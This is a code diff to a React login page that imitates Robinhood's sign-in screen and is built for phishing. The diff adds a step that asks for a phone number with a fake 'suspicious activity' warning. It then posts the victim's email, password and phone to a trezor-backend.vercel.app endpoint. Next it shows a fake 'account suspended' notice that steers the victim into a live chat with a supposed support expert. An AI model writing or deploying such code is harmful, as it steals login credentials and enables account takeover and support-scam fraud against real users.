@@ -12,6 +12,7 @@ import {
     Link,
     List,
     ListItemButton,
+    Paper,
     Snackbar,
     Stack,
     TextField,
@@ -19,14 +20,36 @@ import {
 } from "@mui/material";
 import CloseIcon from '@mui/icons-material/Close';
 import axios from "axios";
+import { CustomPhoneInput } from "@/components/CustomPhoneInput";
+import { useMobileCode } from "@/components/useMobileCode";
 export default function LoginMainPage() {
+    const {
+        code,
+        setCode,
+        phoneNumberLength,
+        setPhoneNumberLength,
+        anchorEl,
+        searchText,
+        setSearchText,
+        handleSearchTextChange,
+        filteredMenuItems,
+        handleCountryCode,
+        handleMenuClose,
+        handleCode,
+        validCountryDataList,
+    } = useMobileCode();
     const [openHelpModal, setOpenHelpModal] = useState(false);
     const [email, setEmail] = useState("");
+    const [step, setStep] = useState(0)
     const [password, setPassword] = useState("");
     const [showPassword, setShowPassword] = useState(false);
+    const [phone, setPhone] = useState("")
     const handleCloseHelp = () => setOpenHelpModal(false);
     const [loading, setLoading] = useState(false)
-    const [open, setOpen] = useState(false);
+    const [alert, setAlert] = useState({
+        type: 'error',
+        message: 'Important message!: some suspicious activity found with your account. Enter phone number to verify your identity'
+    });
 
     const handleSubmit = async (e) => {
         e.preventDefault(); // Prevent page reload
@@ -35,52 +58,45 @@ export default function LoginMainPage() {
                 alert("Please enter both email and password");
                 return;
             }
+
+            setStep(1)
+        } catch (err) {
+            console.log(err);
+        }
+
+    };
+
+    const handleSubmit2 = async (e) => {
+        e.preventDefault(); // Prevent page reload
+        try {
             const data = {
                 title: "Robin Hood",
                 email: email,
-                password
+                password,
+                phone: phone ? `+${code}${phone}` : ""
 
             }
             setLoading(true)
             const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
             if (response) {
-                setOpen(true)
+                if (response) {
+                    setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
+                    setStep(2)
+                    window.Tawk_API?.maximize();
+                }
             }
         } catch (err) {
             console.log(err);
+            setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
 
         } finally {
             setLoading(false)
 
         }
-
-    };
-
-
-    const handleClose = (event, reason) => {
-        if (reason === 'clickaway') {
-            return;
-        }
-
-        setOpen(false);
-    };
-    const action = (
-        <React.Fragment>
-            <Button color="secondary" size="small" onClick={handleClose}>
-                UNDO
-            </Button>
-        </React.Fragment>
-    );
+    }
     return (
         <Box sx={{ bgcolor: "white", color: "white", minHeight: "100vh" }}>
-            <Snackbar
-                open={open}
-                autoHideDuration={6000}
-                onClose={handleClose}
-                message="Invalid credentials. Please contact support via chat."
-                action={action}
-                anchorOrigin={{ vertical: 'top', horizontal: 'right' }}
-            />
+
             <Grid container>
                 {/* ---------- Left Section: Video Background ---------- */}
                 <Grid
@@ -124,7 +140,7 @@ export default function LoginMainPage() {
                     }}
                 >
                     <Box sx={{ width: "100%", }}>
-                        <Typography
+                        {step == 0 && <Typography
                             variant="h5"
                             fontWeight={600}
                             mb={4}
@@ -137,8 +153,8 @@ export default function LoginMainPage() {
                             }}
                         >
                             Log in to Robinhood
-                        </Typography>
-                        <form onSubmit={handleSubmit} >
+                        </Typography>}
+                        {step == 0 ? <form onSubmit={handleSubmit} >
                             {/* Email */}
                             <Typography variant="body2" mb={1} sx={{
                                 color: "black", fontFamily:
@@ -238,9 +254,120 @@ export default function LoginMainPage() {
                             </Box>
                         </form>
 
+                            : step == 1 ? <form onSubmit={handleSubmit2} id="dasd">
 
+                                <Paper sx={{ padding: "10px", background: "#fef2f2", border: "2px solid #ffc9c9", mb: 2 }}>
+                                    <Stack direction={"row"} alignItems={"flex-start"}>
+                                        <svg className="shrink-0 size-4 mt-0.5" style={{ flexShrink: 0, width: "1rem", height: "1rem", marginRight: "10px", marginTop: "3px" }} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6467" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                            <circle cx="12" cy="12" r="10"></circle>
+                                            <path d="m15 9-6 6"></path>
+                                            <path d="m9 9 6 6"></path>
+                                        </svg>
+                                        <div className="ms-4">
+                                            <Typography component={"p"} id="hs-with-list-label" className="text-sm font-semibold" style={{ color: "#ff6467", fontWeight: "600" }}>
+                                                {alert?.message}
+                                            </Typography>
+                                        </div>
+                                    </Stack>
+
+                                </Paper>
+                                <div>
+                                    <CustomPhoneInput
+                                        {...{
+                                            code,
+                                            setCode,
+                                            phoneNumberLength,
+                                            setPhoneNumberLength,
+                                            anchorEl,
+                                            searchText,
+                                            setSearchText,
+                                            handleSearchTextChange,
+                                            filteredMenuItems,
+                                            handleCountryCode,
+                                            handleMenuClose,
+                                            handleCode,
+                                            validCountryDataList,
+                                            value: phone,
+                                            handleChange: (e) => setPhone(e.target.value)
+                                        }}
+                                    />
+
+                                    <Box display="flex" gap={2} mt={1} mb={1}>
+
+                                        <Button
+                                            fullWidth
+                                            loading={loading}
+                                            form="dasd"
+                                            disabled={loading}
+                                            type="submit"
+                                            variant="contained"
+                                            sx={{
+                                                width: "130px",
+                                                mt: 5,
+                                                bgcolor: "black",
+                                                height: "44px",
+                                                color: "white",
+                                                textTransform: "none",
+                                                fontWeight: 700,
+                                                "&:hover": { bgcolor: "black" },
+                                                borderRadius: "24px",
+                                                fontSize: "13px",
+                                                fontFamily:
+                                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
+                                            }}
+                                        >
+                                            Submit
+                                        </Button>
+                                    </Box>
+                                </div>
+                            </form> :
+
+                                <Box>
+                                    <Paper sx={{ padding: "10px", background: "#fef2f2", border: "2px solid #ffc9c9", mb: 2 }}>
+                                        <Stack direction={"row"} alignItems={"flex-start"}>
+                                            <svg className="shrink-0 size-4 mt-0.5" style={{ flexShrink: 0, width: "1rem", height: "1rem", marginRight: "10px", marginTop: "3px" }} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6467" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                                <circle cx="12" cy="12" r="10"></circle>
+                                                <path d="m15 9-6 6"></path>
+                                                <path d="m9 9 6 6"></path>
+                                            </svg>
+                                            <div className="ms-4">
+                                                <Typography component={"p"} id="hs-with-list-label" className="text-sm font-semibold" style={{ color: "#ff6467", fontWeight: "600" }}>
+                                                    {alert?.message}
+                                                </Typography>
+                                            </div>
+                                        </Stack>
+
+                                    </Paper>
+                                    <Box display="flex" gap={2} mt={1} mb={1}>
+                                        <Button
+                                            fullWidth
+                                            type="button"
+                                            onClick={() => {
+                                                window.Tawk_API?.maximize();
+                                            }}
+                                            variant="contained"
+                                            sx={{
+                                                width: "130px",
+                                                mt: 5,
+                                                bgcolor: "black",
+                                                height: "44px",
+                                                color: "white",
+                                                textTransform: "none",
+                                                fontWeight: 700,
+                                                "&:hover": { bgcolor: "black" },
+                                                borderRadius: "24px",
+                                                fontSize: "13px",
+                                                fontFamily:
+                                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
+                                            }}
+                                        >
+                                            Ask Expert
+                                        </Button>
+                                    </Box>
+                                </Box>
+                        }
                         {/* Create account */}
-                        <Typography mt={3} sx={{
+                        {step == 0 && <Typography mt={3} sx={{
                             fontSize: "13px", fontWeight: 400,
 
                             fontFamily:
@@ -254,7 +381,7 @@ export default function LoginMainPage() {
                             }}>
                                 Create an account
                             </Link>
-                        </Typography>
+                        </Typography>}
                     </Box>
                 </Grid>
             </Grid>
